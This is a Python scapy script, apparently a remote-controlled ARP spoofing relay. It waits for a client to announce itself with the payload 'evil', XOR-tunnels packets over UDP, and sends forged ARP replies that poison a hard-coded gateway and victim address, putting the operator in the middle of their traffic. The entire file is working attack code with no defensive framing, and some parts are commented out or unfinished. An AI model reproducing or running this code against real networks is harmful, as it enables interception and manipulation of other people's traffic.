from scapy.all import *
import base64
from itertools import cycle


def xor_crypt_string(data, key = 'awesomepassword', encode = False, decode = False):
   if decode:
      data = base64.decodestring(data)
   xored = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in zip(data, cycle(key)))
   return xored
   
def byte_xor(ba1, ba2):
   return bytes([_a ^ _b for _a, _b in zip(ba1, cycle(ba2))])


def get_mac_packet(targetip):
    packet = Ether(src=userMAC, dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip, psrc=userIP)
    return packet

def attack_arp(attak_ip, gate_ip, attak_mac):
    packet = Ether(src=userMAC, dst=attak_mac)/ARP(op="is-at", pdst=attak_ip, psrc=gate_ip, hwsrc=userMAC, hwdst=attak_mac)
    return packet
    
def sendTransmitingPacket(packetToTransmit):
    packetData = packetToTransmit
    if packetData.haslayer(Ether):
        packetData[Ether].src = userMAC
        
    bits = byte_xor(bytes(packetData), b'pacman')
    send(IP(dst = userIP)/UDP(sport=1111, dport = 65230)/Raw(load = bits))
    

    
def changeSrcMac(packet):
    if packet.haslayer(Ether):
        packet[Ether].src = Ether().src
        
def changeSrcIp(packet):
    if packet.haslayer(IP):
        packet[IP].src = "192.168.43.166"
        
def changeDstMac(packet):
    global userMAC
    if packet.haslayer(Ether):
        packet[Ether].dst = userMAC
        
def changeDstIp(packet):
    global userIP
    if packet.haslayer(IP):
        packet[IP].dst = userIP
        
        
def sendPacketByServer(scapy_user_packet):
    changeSrcMac(scapy_user_packet)
    changeSrcIp(scapy_user_packet)
    if scapy_user_packet.haslayer(IP):
        del(scapy_user_packet[IP].chksum)
    if scapy_user_packet.haslayer(UDP):
        del(scapy_user_packet[UDP].chksum)
    if scapy_user_packet.haslayer(TCP):
        del(scapy_user_packet[TCP].chksum)
    sendp(scapy_user_packet, iface="eth0", verbose=False)
    
def retransmitToUser(server_tmp_packet):
    changeDstMac(server_tmp_packet)
    changeDstIp(server_tmp_packet)
    if server_tmp_packet.haslayer(IP):
        del(server_tmp_packet[IP].chksum)
    if server_tmp_packet.haslayer(UDP):
        del(server_tmp_packet[UDP].chksum)
    if server_tmp_packet.haslayer(TCP):
        del(server_tmp_packet[TCP].chksum)
    sendp(server_tmp_packet, iface="eth0", verbose=False)
    
def getMacFromPacket(packet, ipsrc):
    if packet.haslayer(ARP):
        if packet[ARP].psrc == ipsrc:
            return packet[ARP].hwsrc
            
    return 0

def serverRetransimitUdpPacket(packet):
    global spoofGateMAC
    global spoofVulnMAC
    if packet.haslayer(Ether):
        if(packet[Ether].src == Ether().src):
            return
    
    if packet.haslayer(UDP): 
        if packet.haslayer(Raw):
            user_packet = packet[Raw].load
            user_packet = byte_xor(bytes(user_packet), b'pacman')
            try:
                scapy_user_packet = Ether(user_packet)
            except struct.error:
                return
            else:
                scapy_user_packet.show()
                getMac(spoofGateIP)
                getMac(spoofVulnIP)
                if spoofGateMAC == 0:
                    spoofGateMAC = getMacFromPacket(scapy_user_packet, spoofGateIP)
                else:
                    print(spoofGateMAC)
                    attack_packet = attack_arp(spoofGateIP, spoofVulnIP, spoofGateMAC)
                    sendTransmitingPacket(attack_packet)
               
                if spoofVulnMAC == 0:
                    spoofVulnMAC = getMacFromPacket(scapy_user_packet, spoofVulnIP)
                else:
                    print(spoofVulnMAC)
                    attack_packet = attack_arp(spoofVulnIP, spoofGateIP, spoofVulnMAC)
                    sendTransmitingPacket(attack_packet)
                #sendPacketByServer(scapy_user_packet)
            
                       
def serverRetransmitToUser(packet):
    if packet.haslayer(Ether):
        if(packet[Ether].src == userMAC):
            return
        if(packet[Ether].src == Ether().src):
            return
    retransmitToUser(packet)    

def getMac(targetip):
 packet = get_mac_packet(targetip)
 sendTransmitingPacket(packet)


def serverRetransmit(packet):
    serverRetransimitUdpPacket(packet)
    #serverRetransmitToUser(packet)
 
def getUserMacAndIp(packet):
    global userMAC
    global userIP
    if packet.haslayer(UDP): 
        if packet.haslayer(Ether):
            if packet.haslayer(IP):
                if packet.haslayer(Raw):
                    raw = packet[Raw].load
                    print(raw)
                    if(raw== b'evil\n'):
                        userMAC = packet[Ether].src
                        userIP = packet[IP].src
                        print(userIP)
                        print(userMAC)
    

userIP = 0
userMAC = 0

spoofGateMAC = 0
spoofGateIP = "192.168.43.1"

spoofVulnIP = "192.168.43.184"
spoofVulnMAC = 0

print(Ether().src)


while(userIP == 0):
    sniff(prn=getUserMacAndIp, count=1)
    print(userIP)
    print(userMAC)


sniff(prn=serverRetransmit)
